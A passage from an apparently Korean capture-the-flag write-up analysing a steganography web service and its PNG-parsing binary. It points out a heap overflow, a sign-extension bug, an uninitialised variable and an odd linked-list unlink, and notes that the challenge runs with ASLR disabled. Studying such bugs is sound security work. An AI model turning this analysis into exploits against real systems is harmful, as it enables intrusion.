</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">urandom</span>(<span style="color:#ae81ff">32</span>).<span style="color:#a6e22e">hex</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.png&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">png</span>.<span style="color:#a6e22e">save</span>(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">config</span>[<span style="color:#e6db74">&#39;UPLOAD_DIR&#39;</span>], <span style="color:#a6e22e">filename</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">subprocess</span>.<span style="color:#a6e22e">check_output</span>([<span style="color:#a6e22e">STEGO_PATH</span>,
</span></span><span style="display:flex;"><span>                                      <span style="color:#e6db74">&#39;-e&#39;</span>,
</span></span><span style="display:flex;"><span>                                      <span style="color:#e6db74">&#39;-f&#39;</span>,
</span></span><span style="display:flex;"><span>                                      <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">config</span>[<span style="color:#e6db74">&#39;UPLOAD_DIR&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">filename</span>,
</span></span><span style="display:flex;"><span>                                      <span style="color:#e6db74">&#39;-m&#39;</span>,
</span></span><span style="display:flex;"><span>                                      <span style="color:#a6e22e">msg</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">render_template</span>(<span style="color:#e6db74">&#39;encode_result.html&#39;</span>, <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{result.decode()}&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">route</span>(<span style="color:#e6db74">&#39;/uploads/&lt;path:filename&gt;&#39;</span>, <span style="color:#a6e22e">methods</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">get_uploads</span>(<span style="color:#a6e22e">filename</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send_from_directory</span>(<span style="color:#a6e22e">UPLOAD_DIR</span>, <span style="color:#a6e22e">filename</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">route</span>(<span style="color:#e6db74">&#39;/decode&#39;</span>, <span style="color:#a6e22e">methods</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">get_decode</span>()<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">render_template</span>(<span style="color:#e6db74">&#39;decode.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">route</span>(<span style="color:#e6db74">&#39;/decode&#39;</span>, <span style="color:#a6e22e">methods</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">post_decode</span>()<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;png&#39;</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">files</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">abort</span>(<span style="color:#ae81ff">400</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">png</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">files</span>[<span style="color:#e6db74">&#39;png&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">validate_extension</span>(<span style="color:#a6e22e">png</span>.<span style="color:#a6e22e">filename</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">abort</span>(<span style="color:#ae81ff">400</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">urandom</span>(<span style="color:#ae81ff">32</span>).<span style="color:#a6e22e">hex</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.png&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">png</span>.<span style="color:#a6e22e">save</span>(<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">config</span>[<span style="color:#e6db74">&#39;UPLOAD_DIR&#39;</span>], <span style="color:#a6e22e">filename</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">subprocess</span>.<span style="color:#a6e22e">check_output</span>([<span style="color:#a6e22e">STEGO_PATH</span>,
</span></span><span style="display:flex;"><span>                                      <span style="color:#e6db74">&#39;-d&#39;</span>,
</span></span><span style="display:flex;"><span>                                      <span style="color:#e6db74">&#39;-f&#39;</span>,
</span></span><span style="display:flex;"><span>                                      <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">config</span>[<span style="color:#e6db74">&#39;UPLOAD_DIR&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">filename</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">render_template</span>(<span style="color:#e6db74">&#39;decode_result.html&#39;</span>, <span style="color:#a6e22e">msg</span><span style="color:#f92672">=</span><span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{result.decode()}&#39;</span>)
</span></span></code></pre></div><p>그냥 바이너리를 실행해서 출력한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">sysctl</span> <span style="color:#a6e22e">kernel</span>.<span style="color:#a6e22e">randomize_va_space</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">su</span> <span style="color:#a6e22e">chall</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">c</span> <span style="color:#e6db74">&#34;export LC_ALL=C.UTF-8; export LANG=C.UTF-8; /bin/sh -c &#39;while true; do flask run -h 0.0.0.0 ; done&#39;&#34;</span>
</span></span></code></pre></div><p>aslr이 꺼져있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">de_flag</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">de_flag</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">decode</span>(<span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Error: Please specify either -d(decoding mode) or -e(encoding mode) option.\n&#34;</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">0x4C</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stderr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#a6e22e">message_content</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">LL</span>;
</span></span></code></pre></div><p>png의 청크를 파싱하고, 메세지를 숨기거나 해독할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">stream</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#a6e22e">filename</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v8</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#a6e22e">sig</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">8</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stream</span>);
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ihdr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_chunk</span>(<span style="color:#a6e22e">stream</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">memcmp</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ihdr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">type</span>, <span style="color:#e6db74">&#34;IHDR&#34;</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Error: chunk type mismatched\n&#34;</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">0x1D</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stderr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">master_node</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">set_node</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">ihdr</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ihdr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_chunk</span>(<span style="color:#a6e22e">stream</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">set_node</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">ihdr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_link</span>(<span style="color:#a6e22e">master_node</span>, <span style="color:#a6e22e">v5</span>);                  <span style="color:#75715e">// circular doubly linked
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#a6e22e">memcmp</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ihdr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">type</span>, <span style="color:#e6db74">&#34;IEND&#34;</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>) );  <span style="color:#75715e">// scan while IEND
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftell</span>(<span style="color:#a6e22e">stream</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fseek</span>(<span style="color:#a6e22e">stream</span>, <span style="color:#ae81ff">0</span><span style="color:#a6e22e">LL</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftell</span>(<span style="color:#a6e22e">stream</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">v4</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">v1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Error: wrong footer\n&#34;</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stderr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span></code></pre></div><p>다음과 같이 청크를 파싱한다.
parsechunk 함수는 다음과 같다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">v8</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">chunk</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">sz</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">a1</span>);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">conv_big2little</span>(<span style="color:#a6e22e">sz</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">tpye</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">a1</span>);
</span></span><span style="display:flex;"><span>	...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mem</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>((<span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">__int16</span>)<span style="color:#a6e22e">sz</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mem</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Error: malloc()\n&#34;</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stderr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#a6e22e">mem</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">sz</span>, <span style="color:#a6e22e">a1</span>);
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">crc</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">a1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">read</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Error: fread()\n&#34;</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">0xF</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stderr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">crc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">conv_big2little</span>(<span style="color:#a6e22e">crc</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crc32</span>(<span style="color:#ae81ff">0xFFFFFFFF</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">tpye</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#f92672">~</span>(<span style="color:#a6e22e">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">crc32</span>(<span style="color:#a6e22e">v5</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">mem</span>, <span style="color:#a6e22e">sz</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">v5</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">crc</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Error: crc mismatched\n&#34;</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">0x16</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stderr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v8</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sz</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v8</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">type</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tpye</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v8</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">mem</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v8</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">crc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crc</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">v8</span>;
</span></span></code></pre></div><p>heap overflow가 발생한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">node</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">__fastcall</span> <span style="color:#a6e22e">set_link</span>(<span style="color:#a6e22e">node</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">master_node</span>, <span style="color:#a6e22e">node</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">new_node</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">node</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">result</span>; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">node</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">fd</span>; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">master_node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fd</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bk</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_node</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">master_node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_node</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bk</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">master_node</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_node</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fd</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이런식으로 circular doubly linked list로 연결되어있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( <span style="color:#a6e22e">master_node</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">node</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">a1</span>); ; <span style="color:#a6e22e">pop</span>(<span style="color:#a6e22e">master_node</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">node</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_current_node</span>(<span style="color:#a6e22e">master_node</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">l_ptr</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">uint</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">type</span>, <span style="color:#e6db74">&#34;iTXt&#34;</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">payload</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hdr</span>, <span style="color:#a6e22e">secret_hdr</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span><span style="color:#a6e22e">l_ptr</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">8</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Error: unable to decode\n&#34;</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">0x18</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stderr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">secret_msg_length</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">l_ptr</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">p_secret_msg</span> <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">payload</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">secret_msg</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (<span style="color:#a6e22e">__int16</span>)<span style="color:#f92672">*</span><span style="color:#a6e22e">l_ptr</span>);                  <span style="color:#75715e">// sign extension
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">v2</span> )                                     <span style="color:#75715e">// uninitiaized stack var
</span></span></span></code></pre></div><p>iTXt에 메세지를 암호화하고, decode는 iTXt에서 메세지를 해독한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span> 	<span style="color:#a6e22e">prev</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">master_node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cur</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">master_node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span>;                    <span style="color:#75715e">// real current node
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">next</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cur</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">next</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bk</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">master_node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">prev</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">next</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(<span style="color:#a6e22e">cur</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">payload</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(<span style="color:#a6e22e">cur</span>);
</span></span></code></pre></div><p>노드를 unlink하는데, 약간 이상하다. masternode→fd→fd로 돌게된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( <span style="color:#a6e22e">master_node</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">node</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">a1</span>); ; <span style="color:#a6e22e">pop</span>(<span style="color:#a6e22e">master_node</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">node</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_current_node</span>(<span style="color:#a6e22e">master_node</span>);
